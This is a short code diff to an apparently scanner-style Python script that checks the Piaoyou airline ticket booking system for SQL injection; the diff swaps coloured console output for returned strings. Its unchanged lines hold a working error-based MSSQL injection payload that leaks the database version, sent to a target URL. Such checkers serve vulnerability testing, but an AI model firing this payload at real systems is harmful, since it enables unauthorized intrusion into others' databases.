@@ -8,8 +8,8 @@ description: multi sqli。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class piaoyou_multi_sqli_BaseVerify:
     def __init__(self, url):
@@ -30,12 +30,12 @@ class piaoyou_multi_sqli_BaseVerify:
                 vulnurl = self.url + url + "%20AnD%201=CoNvErT(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@version)--"
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"WtFaBcMic" in req.text:
-                    cprint("[+]存在票友机票预订系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在票友机票预订系统SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = piaoyou_multi_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
